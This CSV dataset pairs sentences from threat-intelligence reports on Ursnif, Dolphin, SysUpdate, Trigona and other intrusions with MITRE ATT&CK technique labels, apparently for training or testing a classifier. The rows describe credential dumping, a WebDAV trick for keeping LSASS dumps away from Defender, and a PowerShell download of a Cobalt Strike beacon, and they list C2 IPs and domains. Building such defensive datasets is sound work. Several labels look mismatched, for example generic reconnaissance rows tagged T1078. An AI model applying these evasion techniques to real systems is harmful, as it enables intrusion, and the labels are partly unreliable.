text,label
"Unfortunately, during the response process, the above files no longer exist on the compromised system, possibly due to the hacker’s evidence deletion.",T1027
The cm.exe file that is dropped into the C:\PerfLogs\ folder is the standard Windows command line tool cmd.exe.,T1059.003
"Specifically: The Run class creates a listener that listens for connections to port 443 at the path https://*:443/ews/web/webconfig/. After listening, the malware creates a new thread that calls to r. Method r does: - Check whether the received request has data in the body or not, if not then returns result 404.",T1071.001
"i does: - Decrypt the request received using AES algorithm where the first 16 bytes of the request are the IV value, the next 16 bytes are the key value, the rest are the data.",T1140
"- After decoding, get the first element in the array as a flag to handle the defined cases as follows: o Case 0: Call to method info.",T1140
This method is responsible for collecting system information.,T1082
"Information such as operating system architecture, framework version, operating system version, etc.",T1082
"The array array3 will take the first 2 elements as parameters for method r, which is responsible for executing the command o Case 3: Call to method ld, which is responsible for listing directory and file information in the format D|-|<Date created> |<Date modified> |<folder or file name> o Case 4: Call to method wf, which is responsible for writing files o Case 5: Call to method rf, which is responsible for reading files o Case 6: Create a folder o Case 7: Delete file or folder o Case 8: Moving file o","T1083, T1070.004"
Victim 1: https://*:443/ews/web/webconfig/ https://*:443/owa/auth/webcccsd/ https://*:444/ews/auto/ https://*:444/ews/web/api/ Victim 2: http://*:80/owa/auth/Current/script/ https://*:443/owa/auth/Current/script/ GTSC also detected that the DLL was injected into the memory of the svchost.exe process.,T1055
Sending and receiving data with C2 using the RC4 encryption algorithm where the key will be generated at runtime.,T1573.001
GlobeImposter’s Delivery Methods Explained GlobeImposter is most often delivered via phishing email as an attachment or a link to a malicious attachment.,T1566.001
The archives often include a JavaScript (.js) file that downloads and executes the GlobeImposter payload.,T1027
"MERCURY likely exploited known vulnerabilities in unpatched applications for initial access before handing off access to DEV-1084 to perform extensive reconnaissance and discovery, establish persistence, and move laterally throughout the network, oftentimes waiting weeks and sometimes months before progressing to the next stage.",T1190
Microsoft assesses that MERCURY gains access to the targets through remote exploitation of an unpatched internet-facing device.,T1190
"Early activities, related attacker tools and techniques Microsoft assesses with moderate confidence that the threat actors attempted several times and succeeded to perform initial intrusion leveraging exposed vulnerable applications, for example, continuing to exploit Log4j 2 vulnerabilities in unpatched systems in July 2022.",T1190
"Installing web shells Adding a local user account and elevating privileges to local administrator Installing legitimate remote access tools, such as RPort, Ligolo and eHorus Installing a customized PowerShell script backdoor Stealing credentials Once the persistence is established, the threat actors perform extensive discovery leveraging common native Windows tools and commands such as netstat and nltest.","T1016, T1219"
Such reconnaissance activities were seen leveraged throughout the attack chain.,T1078
The threat actors consistently perform extensive lateral movement actions using the acquired credentials within a targeted environment.,T1078
"These actions mainly involved: Remote scheduled tasks to launch their customized PowerShell backdoor Windows Management Instrumentation (WMI) to launch commands on devices Remote services to run encoded PowerShell commands After infecting the new devices, the threat actors often installed the same persistence mechanisms as described above.","T1047, T1053.005"
"On-premises destructive impact In observed activity, the threat actors leveraged highly privileged credentials and access to domain controllers on on-premises destructive operations to prepare for large-scale encryption of targeted devices.",T1078
"To do so, they first interfered with security tools using Group Policy Objects (GPO).",T1484.001
"With defenses impaired, the threat actors proceeded to stage the ransomware payload in the NETLOGON shares on several domain controllers.",T1484.001
GPO was leveraged again to register a scheduled task used to launch the ransomware payload.,"T1484.001, T1053.005"
"On-premises attack flow Moving from on-premises to cloud To move from on-premises to the cloud, the threat actors had to first compromise two privileged accounts and leverage them to manipulate the Azure Active Directory (Azure AD) Connect agent.",T1078
"Two weeks before the ransomware deployment, the threat actors first used a compromised, highly privileged account to access the device where the Azure Active Directory (Azure AD) Connect agent is installed.",T1078
The threat actors then used these credentials to pivot from the on-premises environment to the Azure AD environment.,T1078
"Extracting credentials Two weeks before the ransomware deployment, the threat actors were observed using compromised credentials to access the Azure AD Connect device.",T1078
"Shortly before the ransomware deployment, we observed authentication from a known attacker IP address into the Azure AD Connector cloud account.",T1078
"Cloud destructive impact On the day of the ransomware attack, the threat actors executed multiple actions in the cloud using two privileged accounts.",T1078
"The first account was the compromised Azure AD Connector account, which had Global Administrator permissions as it was set up for an old solution (DirSync).",T1078
"For the second account, which also had Global Administrator permissions, the threat actors leveraged RDP for access into the account.",T1021.001
"Even though this account had MFA in place, the threat actors accessed it through RDP, which is an open session that evades MFA blocking their activities.",T1021.001
"Pivoting to the cloud Mass Azure resource deletion On the same day, a successful sign-in to the Microsoft Azure environment was observed.",T1078
"The Azure AD Connector account and the compromised administrator account were then used to perform significant destruction of the Azure environment—deleting within a few hours server farms, virtual machines, storage accounts, and virtual networks.",T1078
"Email impersonation The threat actors used the compromised administrator account to grant SMTP Send on behalf permissions to the Azure AD Connector account over a high-ranking employee’s mailbox, using the Set-Mailbox PowerShell cmdlet. Figure 6.",T1078
"Note: Those files will still get executed, if the user clicks on run!",T1204.002
"Further notes Full path to file and hidden files By supplying a full path like dbexport.zip\app.jar to the explorer location bar, the binary will immediately be executed.",T1564.001
"LSASS Dump A side effect of the WebDAV is, that the Defender is not going to delete files correctly on that shared folder.",T1003.001
As LSASS dumps are nowadays recognized by the dump file itself this is a nice way to get your hands on the file.,T1003.001
"This will still trigger an alarm, so absolutely not OPSEC!",T1003.001
LSASS dump in c:\tmp detected and deleted,T1003.001
"Oh oh, something wrong with defender Something wrong for the Defender LSASS dump in the WebDAV detected, but file not deleted If you even want to improve this workflow, there is a great tool called PowerHub offering a BlackHole WebDAV, meaning the server will immediately move the file out of the WebDAV.",T1003.001
"To start the loading chain after installation, it creates a one-time scheduled task.",T1053.005
"Step 1, the Python script, reads a specified file, XOR-decrypts its contents, and executes the resulting shellcode.",T1140
"Step 2, shellcode, creates a host process (random CLI executable from %WINDIR%\System32\*.exe), XOR-decrypts further shellcode carried within itself, and injects it into the created process.","T1055, T1140"
"Step 3, another shellcode, XOR-decrypts an embedded PE file – the Dolphin backdoor – and loads and executes it using a custom PE loader.","T1055, T1140"
"We named the backdoor Dolphin based on a PDB path found in the executable: D:\Development\BACKDOOR\Dolphin\x64\Release\Dolphin.pdb Persistence The backdoor periodically checks and creates its own persistence by making sure that Step 1 of the loader is run every time the system is started, via a registry Run value, in the same way as in the installer: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\<random_run_name>\”%appdata%\Python27({32|64})\pythonw.exe” “<loader_step_1>” “<loader_encrypted_step_2>” Capabilities The following basic information about the computer and the backdoor is collected: Current backdoor configuration Username Computer name Local and external IP address List of installed security products RAM size and usage Result of check for debugger and other inspection tools (such as Wireshark) OS version Current time Malware version Dolphin downloads commands, issued by its operators, from Google Drive storage and executes them.","T1082, T1033, T1547.001, T1518.001, T1016"
"After execution, the output of commands is uploaded.",T1041
"File exfiltration By default, Dolphin searches all non-fixed drives (USBs), creates directory listings and exfiltrates files by extension.",T1083
"This search can be extended to fixed drives (HDDs), via dedicated commands.",T1005
"The following file extensions of interest, specific to media, documents, emails, and certificates, are specified in the default configuration: jpg, doc, xls, ppt, hwp, url, csv, pdf, show, cell, eml, odt, rtf, nxl, amr, 3gp, m4a, txt, msg, key, der, cer, docx, xlsx, pptx, pfx, mp3 Besides this automatic search, specific files can be exfiltrated.",T1005
"The command to get specific files was improved, by caching/storing it in the configuration until completion.",T1083
It creates directory listings and exfiltrates files.,T1083
Keylogging and screenshots Dolphin logs keystrokes for windows with titles containing substrings specified in its configuration.,T1056.001
"This is done via the GetAsyncKeyState API, with keystrokes being logged along with the window name and current time.","T1106, T1056.001"
Screenshots are also taken at a configurable interval; the default is once every 30 seconds.,T1113
"Screenshots and keylogging are enabled by default, and can be toggled via a command.","T1113, T1056.001"
"The shellcode is stored in the registry, under one of the following keys: HKCU\Software\Microsoft\Windows\CurrentVersion\Themes\Classic\<random_number> HKCU\Software\Microsoft\OneDrive\Update\<random_number> HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\HttpsSoftware\Microsoft\Internet Explorer\Zone\<random_number> (two subkeys as one, likely a coding error)",T1112
It can be executed either locally or in a specified separate process that is created and injected.,T1055
"In the newer versions, the shellcode is stored in files instead of the registry, and the stored shellcode is loaded and executed on Dolphin’s startup, which was not the case in version 1.9 (the original version we analyzed).",T1547.001
Shell commands Dolphin can execute shell commands; this is done via the popen API and their output is retrieved.,"T1106, T1059.003"
"First, it enables access to Gmail via the IMAP protocol by sending an HTTP POST request to: https://mail.google.com/mail/u/0/?ik=<GM_ID_KEY>&at=<GM_ACTION_TOKEN>&view=up&act=prefs",T1071.001
"Data staging Dolphin exfiltrates data to Google Drive storage, staging the data in encrypted ZIP archives before upload.","T1041, T1074.001"
"The content is encrypted using AES CBC with random 16-byte keys and IVs, which are stored at the file’s beginning.",T1027
An example of a decrypted configuration is shown in Figure 3.,T1140
"It contains, among others, the following: Encryption keys Credentials for Google Drive API access Window titles to keylog List of file extensions to exfiltrate Dolphin evolution Since the initial discovery of Dolphin in April 2021, we have observed multiple versions of the backdoor, in which the threat actors improved the backdoor’s capabilities and made attempts to evade detection.",T1056.001
Most strings in this version are base64 encoded.,T1027
The base64-encoded strings were plaintext again in this version.,T1027
We observed the following additional changes: Command to steal credentials restored in a different form; it now executes shellcode from the C&C Command to get files from portable devices completely removed Command to get files from drives is now cached/stored in the configuration until completion.,T1083
"After being deployed on selected targets, it searches the drives of compromised systems for interesting files and exfiltrates them to Google Drive.","T1041, T1083"
APIDolphin uses Windows API functions to execute files and inject processes.,"T1106, T1055"
PersistenceT1053.005Scheduled Task/Job: Scheduled TaskDolphin uses a temporary scheduled task to start after installation. T1547.001Boot or Logon Autostart Execution: Registry Run Keys / Startup FolderDolphin uses Run keys for persistence of its loader.,"T1547.001, T1053.005"
T1027Obfuscated Files or InformationDolphin has encrypted components.,T1027
T1083File and Directory DiscoveryDolphin can obtain file and directory listings.,T1083
T1518.001Software Discovery: Security Software DiscoveryDolphin obtains a list of installed security software.,T1518.001
"T1082System Information DiscoveryDolphin obtains various system information including OS version, computer name and RAM size.",T1082
T1016System Network Configuration DiscoveryDolphin obtains the device’s local and external IP address.,T1016
T1033System Owner/User DiscoveryDolphin obtains the victim’s username.,T1033
KeyloggingDolphin can log keystrokes.,T1056.001
T1005Data from Local SystemDolphin can collect files from local drives.,T1005
T1074.001Data Staged: Local Data StagingDolphin stages collected data in a directory before exfiltration.,T1074.001
CaptureDolphin can capture screenshots.,T1113
Command and ControlT1071.001Application Layer Protocol: Web ProtocolsDolphin uses HTTPS to communicate with Google Drive.,T1071.001
T1567.002Exfiltration Over Web Service: Exfiltration to Cloud StorageDolphin exfiltrates data to Google Drive.,T1041
"Loading process We observed the loading process entailing the following steps: The attacker runs rc.exe, a legitimate “Microsoft Resource Compiler” signed file , which is vulnerable to a DLL side-loading vulnerability, and loads a file named rc.dll.",T1574.002
The rc.bin file is a Shikata Ga Nai encoded shellcode that decompresses and loads the first stage in memory.,"T1027, T1140"
"Depending on the number of command line parameters, different actions are performed: Zero or two parameters: “Installs” the malware in the system, and calls Stage 1 again via process hollowing with four parameters One parameter: Same as previous action but without the “installation” Four parameters: Creates a memory section with the DES-encrypted malware configuration and a second Shikata Ga Nai shellcode decompressing and loading Stage 2.","T1027, T1055, T1140"
It then runs Stage 2 via process hollowing.,T1055
"Depending on the privileges of the process, the malware either creates a registry key or a service that launches the moved executable rc.exe with one parameter.","T1569.002, T1112"
"Updated SysUpdate loading process routine We saw different legitimate executables being used, sideloading different DLL names, and multiple binary files names being loaded by those DLLs.",T1574.002
We identified the executables and sideloaded files as follows:,T1574.002
SysUpdate’s seemingly legitimate executables and their respective sideloaded files Legitimate application name Certificate signer Side-loaded DLL name Loaded binary file name INISafeWebSSO.exe Initech inicore_v2.3.30.dll inicore_v2.3.30.bin rc.exe Microsoft rcdll.dll rcdll.bin dlpumgr32.exe DESlock DLPPREM32.dll sv.bin GDFInstall.exe UBISOFT ENTERTAINMENT GameuxInstallHelper.DLL sysconfig.bin route-null.exe Wazuh libwazuhshared.dll wazuhext.bin route-null.exe Wazuh libwazuhshared.dll agent-config.bin wazuh-agent.exe Wazuh libwinpthread-1.dll wazuhext.bin We want to highlight that this is the first time we observed a threat actor abusing a sideloading vulnerability in a Wazuh signed executable.,T1574.002
"Malware features Looking at the features, several of the functions found in the latest update are similar to the previous SysUpdate version: Service manager (lists, starts, stops, and deletes services) Screenshot grab Process manager (browses and terminates processes) Drive information retrieval File manager (finds, deletes, renames, uploads, downloads a file, and browses a directory)","T1057, T1070.004, T1105, T1083, T1059.003, T1113"
Command execution Iron Tiger also added a feature that had not been seen before in this malware family:,T1059.003
"C&C communication with DNS TXT records First, the malware retrieves the configured DNS servers by calling the GetNetworkParams API function and parsing the DnsServerList linked list.",T1106
"In all versions, the malware retrieves information on the infected machine and sends it to the C&C encrypted with DES.","T1041, T1573.001"
Collected machine information includes the following: Randomly generated GUID Hostname Domain name Username User privileges Processor architecture Current process ID Operating system version Current file path Local IP address and port used to send the network packet The configuration is encrypted with a hardcoded DES key and is a few bytes long following the structure enumerated below: Table 2.,"T1573.001, T1057, T1082, T1033, T1016"
"= regular C&C 0x01 C&C domain name Variable dev.gitlabs.me Port number 4 0x00000050 Size of next section 4 Next section contains all the hardcoded names (folder, files, registry values) 0x00000034 Name of the hardcoded directory where files are copied Variable The folder is located either in % gtdcfp Name of the executable vulnerable to side loading Variable TextInputHost.exe Name of the malicious side-loaded DLL Variable rc.dll Name of the binary file containing the encoded Stage 1 Variable rc.bin Name of the service or registry key value used for persistence Variable gtdcfp We noted that Stage 2 does not embed the configuration file, which is copied in memory by the previous stage.","T1574.002, T1074.001"
We only saw one case where there was only one stage being decrypted in memory and the configuration was hardcoded.,T1140
"Then, the malware retrieves information on the compromised computer and sends it to the C&C. The following information is sent to the C&C, encrypted with a hardcoded key and DES CBC algorithm: GUID Host name Username Local IP address and port used to send the request Current PID Kernel version and machine architecture Current file path Boolean (0 if it was launched with exactly one parameter, 1 otherwise)","T1041, T1573.001"
The software has been used by multiple APT and cybercrime groups in the past to obfuscate their malware.,T1027
"Interestingly, the threat actor not only signed some of its malicious executables with the stolen certificate, but also used VMProtect to obfuscate one of them.",T1027
It appears that a chat application was used as a lure to entice the victim into opening the malicious file.,T1204.002
"In general, the features were simple; the malware decrypts the saved passwords to a file named “passwords.txt”, and the cookies to a file named “cookies.txt”.",T1140
"It then copies the “Login Data” file to a temporary file “chromedb_tmp”, issues an SQL query to extract the URL, login, and password fields from the file, and then decrypts them and appends the result to the “passwords.txt” file.","T1552.001, T1140"
"It proceeds to copy the “Cookies” file to a temporary file “chromedb_tmp”, extracts multiple fields from it using an SQL query, and then decrypts the content before copying the result to the “cookies.txt” file.",T1140
"The malware displayed an interesting execution flow, which included using a renamed copy of rundll32.",T1218.011
The malware also established persistence on the host with the creation of a registry run key.,T1547.001
"The threat actor first ran some initial discovery on the host using built-in Windows utilities like ipconfig, systeminfo, net, and ping.","T1016, T1082"
"Shortly afterwards, the threat actor injected into various processes and then proceeded to access lsass memory on the host to extract credentials.","T1003.001, T1055"
These files were transferred to the domain controller over SMB.,T1570
"After connecting to the Cobalt Strike beacon on the domain controller, the threat actor executed another round of discovery tasks and dumped lsass memory on the domain controller.",T1003.001
"At that time, the threat actor became active by initiating a proxied RDP connection via the Cobalt Strike beacon to the domain controller.","T1090, T1021.001"
"One host of interest was one of the backup servers, which was logged into, the state of backups were checked and running processes were reviewed before exiting the session.",T1057
"Once mounted, the new drive contained a LNK file 6570872.lnk and hidden folder “me”.",T1564.001
"If we parse this LNK file with LECmd (by Eric Zimmerman), it highlights the execution path and the icon it appears as: The contents of hidden folder “me”, included several files and folders that were used for the execution of Ursnif.",T1564.001
"Of interest, the folder included a legitimate copy of rundll32.exe (renamed to 123.com).",T1218.011
Summary of the files found in 3488164.iso (a detailed break down of these can be found in Execution): File Name Purpose 6570872.lnk LNK file that executes alsoOne.bat me/by Empty folder me/here Empty folder me/123.com Renamed legitimate version of rundll32.exe me/alsoOne.bat Batch script to run canWell.js with specific arguments me/canWell.js Reverses argument strings and executes tslt.db with 123.com me/itslt.db Ursnif DLL or.jpg Image not used.,T1059.003
"Execution Once the user had mounted the ISO and the LNK file was executed by the user, the complex execution flow started.",T1204.002
"Ursnif Malware Highlighted in Initial Access, the LNK file would execute a batch script alsoOne.bat .",T1059.003
"Exec(): me/123.com me/itsIt.db,DllRegisterServer Using the SRUM database, we were able to determine that the custom rundll32.exe binary downloaded approximately 0.4 MB of data.",T1218.011
"; Analyst Note: The names of the registry values changed when we ran the payload in a sandbox during analysis, and hence suspected to be generated at random at execution.",T1112
The last registry key was used to store additional PowerShell code.,T1112
"This script called a combination of QueueUserAPC, GetCurrentThreadId, OpenThread, and VirtualAlloc to perform process injection of shellcode stored in Base64.","T1027, T1106, T1055"
"@""C:\Users\<REDACTED>\AppData\Local\Temp\npfdesjp\npfdesjp.cmdline"" Finally, a unique command spawned from the parent explorer.exe process that was called pause.exe with multiple arguments, which appeared to not provide any additional functionality.",T1059.003
"""C:\Windows\syswow64\cmd.exe"" /C pause dll mail, , A sigma rule for this cmdline can be found in the Detections section of this report.",T1059.003
"Cobalt Strike An instance of cmd.exe was launched through explorer.exe which ran the following command: powershell.exe -nop -c ""start-job { param($a) Import-Module BitsTransfer; $d = $env:temp + '\'",T1059.003
It is possible this explorer.exe ➝ cmd.exe session was through a VNC session.,T1059.003
This PowerShell command started a BITS job to download a Cobalt Strike beacon from 193.201.9[.]199 and saved it with a random name to %TEMP%.,T1105
"Persistence Once the foothold had been achieved, after execution of Ursnif on the beachhead host, persistence was achieved by creating a ‘Run’ key named ManagerText which was configured to execute a LNK file which executed a PowerShell script.",T1547.001
Credential Access We observed a process created by Cobalt Strike accessing lsass.exe.,T1003.001
The GrantedAccess code of 0x1010 is a known indicator of such tools as Mimikatz.,T1003.001
"""reg.exe query ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"" /s >>",T1012
"C:\Users\<REDACTED>\AppData\Local\Temp\BD2C.bin1"" Manual discovery Once the threat actor had Cobalt Strike running on the beachhead host, they ran the following commands: whoami whoami /groups time ipconfig /all systeminfo The threat actor quickly took interest in a support account.","T1016, T1082"
net user <REDACTED>,T1059.003
"The threat actor also used a batch script to collect a list of all computer objects on the domain using C:\Windows\system32\cmd.exe /C adcomp.bat which contained the PowerShell command: powershell Get-ADComputer -Filter * -Properties Name,Operatingsystem, OperatingSystemVersion, OperatingSystemServicePack,IPv4Address >> log2.txt During the final actions taken by the threat actors before eviction, after completing RDP connections to various hosts on the network, the threat actors checked running processes on the accessed hosts via taskmanager, which were started via their interactive RDP session as noted by the /4 command line argument.","T1057, T1059.003, T1021.001"
C:\Windows\system32\taskmgr.exe /4 Lateral Movement WMI was used to pivot to a domain controller on the network.,T1047
"The actor leveraged Impacket’s wmiexec.py to execute commands with a semi-interactive shell, most likely using credentials gathered by the previous LSASS access.","T1083, T1047, T1003.001"
"The commands executed included directory traversal, host discovery, and execution of tools on the DC.",T1083
"As Impacket interacts with remote endpoints via WMI over TCP via DCERPC, its possible to inspect network level packets: The use of Impacket by threat actors has been recently detailed by the US CERT in alert AA22-277A – Impacket and Exfiltration Tool Used to Steal Sensitive Information from Defense Industrial Base Organization.","T1047, T1005"
We can observe a number of WMI requests via DCERPC from one endpoint to a target endpoint based on the ports.,T1047
Correlating the network activity to the host activity confirms that the ‘Powershell.exe’ process initiated the WMI requests.,T1047
13Cubed (Richard Davis) also released an amazing resource to investigate Impacket related incidents here: https://www.13cubed.com/downloads/impacket_exec_commands_cheat_sheet_poster.pdf One of the observed commands invoked via WMI was ‘firefox.exe’.,T1047
"The process generated a significant volume of network connections to 193.201.9[.]199, averaging ~6K requests per hour, equating to >150K connections throughout the duration of the intrusion.",T1021.001
RDP was also used by the threat actor on the final two days of the intrusion to connect to various hosts from a domain controller proxying the traffic via the firefox.exe Cobalt Strike beacon. Command and Control Ursnif Ursnif was seen using the following domains and IPs: 5.42.199.83superliner.top 62.173.149.7 internetlines.in 31.41.44.97 superstarts.top 31.41.44.27 superlinez.top 31.41.44.27 internetlined.com 208.91.197.91 denterdrigx.com: 187.190.48.135 210.92.250.133 189.143.170.233 201.103.222.246 151.251.24.5 190.147.189.122 115.88.24.202 211.40.39.251 187.195.146.2 186.182.55.44 222.232.238.243 211.119.84.111 51.211.212.188 203.91.116.53 115.88.24.203 190.117.75.91 181.197.121.228 190.167.61.79 109.102.255.230 211.119.84.112 190.107.133.19 185.95.186.58 175.120.254.9 46.194.108.30 190.225.159.63 190.140.74.43 187.156.56.52 195.158.3.162 138.36.3.134 109.98.58.98 24.232.210.245 222.236.49.123 175.126.109.15 124.109.61.160 95.107.163.44 93.152.141.65 5.204.145.65 116.121.62.237 31.166.129.162 222.236.49.124 211.171.233.129 211.171.233.126 211.53.230.67 196.200.111.5 190.219.54.242 190.167.100.154 110.14.121.125 58.235.189.192 37.34.248.24 110.14.121.123 179.53.93.16 175.119.10.231 211.59.14.90 188.48.64.249 187.232.150.225 186.7.85.71 148.255.20.4 91.139.196.113 41.41.255.235 31.167.236.174 189.165.2.131 1.248.122.240 We also observed several modules for Ursnif downloaded from the following IP:,"T1090, T1021.001"
"Exfiltration Several HTTP Post events were observed to the identified domains denterdrigx[.]com, superliner[.]top and 5.42.199[.]83, masquerading as image uploads.",T1071.001
"The user agent ‘Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64)’, an unusual browser configuration to masquerade as, which indicates use of Internet Explorer 8.0 (that was released ~2009).",T1071.001
The POST event included a MIME part indicating file upload activity,T1071.001
The example HTTP stream containing the content The file that was uploaded 775E.bin was deleted by the injected ‘Explorer.exe’ process from the target endpoint in folder ‘\Users\<REDACTED>\AppData\Local\Temp’,"T1027, T1071.001"
"In this example, the mix of activity can be observed as: Impact The threat actor was able to RDP to a backup server using the admin credentials they acquired.","T1021.001, T1078"
"Logon Process: NtLmSsp Authentication Package: NTLM Transited Services: - Package Name (NTLM only): NTLM V2 During that time, the threat actor undertook a number of hands-on keyboard actions; this included reviewing backups in a backup console, checking on running tasks, and using notepad to paste in the following content.",T1057
The Zip contains an ISO image file.,T1204.002
The victim double clicks the ISO to mount it (1).,T1204.002
"The mounted file contains a hidden folder (4), a 200+MB padded file and a visible shortcut file disguised as a zip.","T1027, T1564.001"
The shortcut file (2) executes a CMD file (3) when clicked.,T1059.003
The CMD file contains commands which use certutil (renamed here as slaughterhouse.exe) to decode Qakbot’s DLL (brainstorms.sql).,"T1059.003, T1140"
"This file is base64 twice, thus requires two rounds of decoding using certutil.","T1027, T1140"
The decoded DLL is then executed using rundll32 and injects Qakbot into wermgr.exe.,"T1055, T1140, T1218.011"
"Victims can be lured into clicking executable content including binaries, scripts or shortcut files masquerading as benign filetypes such as PDFs or folders.",T1204.002
The use of ISO images has seen some iterative improvements throughout the last year by threats such as Qakbot.,T1204.002
"This includes encapsulating the image in one or more filetypes (Zips, PDFs, HTML), padding the contents with benign data or chaining together a series of scripts to decode or unpack the final payload.","T1027, T1140"
"It included a standalone file padded with over 200MB of blank spaces, likely to impede analysis of the decompressed ISO file.",T1027
"Unit 42 researchers have observed Trigona’s threat operator engaging in behavior such as obtaining initial access to a target’s environment, conducting reconnaissance, transferring malware via remote monitoring and management (RMM) software, creating new user accounts and deploying ransomware.",T1219
"The ransomware then appends the ._locked file extension, modifies registry keys to maintain persistence, and drops ransom notes.",T1112
"Creates two registry keys for persistence, one for the ransomware binary and another for the ransom note.",T1547.001
"“path” Encrypts only files contained within specified path /!local Does not encrypt local system files, only encrypts files on local network /!lan Does not encrypt local network files, only encrypts files on local system /autorun_only “path” Creates registry key for persistence only.",T1547.001
"Allows for optional “path” to be provided to override default path, does not encrypt files The ransomware establishes persistence through the creation of two keys in CurrentVersion\Run.",T1547.001
Keys found in CurrentVersion\Run contain references to programs that will execute when a user logs in.,T1547.001
"The HTML code in this file contains embedded JavaScript functionality, which displays ransom note details as shown below in Figure 1.",T1027
"After conducting reconnaissance, Trigona operators used Splashtop – a remote access and management (RMM) tool – to transfer the following malware into the target’s environment.",T1072
Start.bat Start.bat is a batch script that performs the following activities: It creates a new folder at C:\temp It copies other malicious batch and EXE files from a compromised internal Server Message Block (SMB) server to the newly created temp folder It executes Turnoff.bat Turnoff.bat Turnoff.bat is a cleanup script used to remove evidence of the attack on a system.,"T1027, T1570, T1059.003"
"It does so by performing the following activities: Clearing the Recycle Bin of any mounted drive Attempting to use sc stop and taskkill to stop over 100 services related to various areas ranging from remote desktop tools to Windows Defender Attempting to stop services related to VMware, Hyper-V and SQL Ending several running tasks related to the stopped services mentioned above Clear Windows Event Logs (using wevutil cl)",T1562.001
42 researchers have observed that cleanup scripts from other threat actors are usually smaller and more specific to the tools used by that actor.,T1027
Newuser.bat Newuser.bat is a batch script that creates a new user with the name fredla and the password Qw123456.,T1059.003
"DC2.exe DC2.exe contains a password protected version of Mimikatz, which is a tool used for extracting sensitive information such as passwords and authentication credentials from a Windows operating system.","T1027, T1003.001"
This version of Mimikatz has been compressed using UPX.,T1027
"While UPX is often legitimately used to reduce file size, we have observed threat actors utilizing UPX and other packing programs to evade static detection of the underlying payload.",T1027
"Among its many legitimate uses, Unit 42 researchers have most often observed Mimikatz being leveraged maliciously by threat actors in the following ways: Credential Loading Mimikatz loads credentials from various sources such as Windows memory, Local Security Authority Subsystem Service (LSASS) process and the Windows registry.",T1003.001
"Credential Manipulation Mimikatz allows the user to manipulate the dumped credentials, such as changing passwords, creating new user accounts and adding users to groups.",T1003.001
"DC4.exe DC4.exe is a small, UPX-packed password protected binary that generates and executes an embedded batch file.","T1027, T1059.003"
"Upon execution, the batch file makes the following changes to the system: Disables the User Account Control (UAC) and sets cmd.exe as a debugger for HelpPane.exe, utilman.exe, Magnify.exe and sethc.exe.","T1059.003, T1548.002"
Opens specific ports on the firewall to allow remote desktop connections using the netsh command.,"T1021.001, T1112"
Modifies the Windows registry to allow remote desktop connections.,"T1021.001, T1112"
"Wrapping Advanced Port Scanner in Inno Setup adds an additional layer of obfuscation to the code, and it is likely to evade static signature detection, forcing dynamic analysis to determine functionality rather than relying on traditional static code signatures.",T1027
Software Deployment Tools Trigona operators use Splashtop to move laterally and transfer malware between compromised hosts in the victim’s environment.,T1072
"Accessibility Features DC4.exe creates a batch script that, when executed, creates a “Sticky Keys backdoor” that allows for creation of a command prompt with NT AUTHORITY\SYSTEM privileges. T1136.",T1059.003
Obfuscated Files or Information Trigona operators use UPX to pack DC2.exe and DC4.exe to avoid static signature detection.,T1027
"For DC6.exe, Trigona hid the installer for Advanced Port Scanner within Inno Setup installer to evade static signature detection. T1112.",T1027
"Modify Registry DC4.exe creates a batch script that, when executed, modifies the Windows Registry to allow remote desktop connections.","T1059.003, T1112"
Disable or Modify System Firewall Trigona operators open up an Remote Desktop Protocol (RDP) port in the firewall with DC4.exe. T1070.001.,T1021.001
"Indicator Removal: File Deletion Trigona operators delete files such as mim.exe, mim32.exe, zam.exe and zam.bat to cover their tracks.",T1070.004
Credentials from Password Stores Trigona operators use Mimikatz to dump passwords. T1003.001.,T1003.001
OS Credential Duping: LSASS Memory Trigona operators use Mimikatz to dump passwords from LSASS.,T1003.001
Remote Desktop Protocol Trigona operators utilize RDP to move laterally in the victim’s environment.,T1021.001
Lateral Tool Transfer Trigona operators use Splashtop to transfer malicious tools from computer to computer in the victim’s environment.,T1570
"Ingress Tool Transfer Trigona operators utilize Splashtop to transfer netscan.exe, netscan.lic, netscan.xml, newuser.bat, start.bat and turnoff.bat. T1219.",T1072
Remote Access Software Trigona operators install and execute remote access tools such as Splashtop on targeted systems.,T1219
We hope that shining a light on Trigona and its uncommon technique of using password-protected executables to obfuscate malware helps defenders better protect their organizations against this threat.,T1027
"The APT group utilizes spear-phishing techniques to obtain initial access, employing a combination of outdated Microsoft Office document vulnerabilities, novel evasion techniques, and highly potent backdoor malware.",T1072
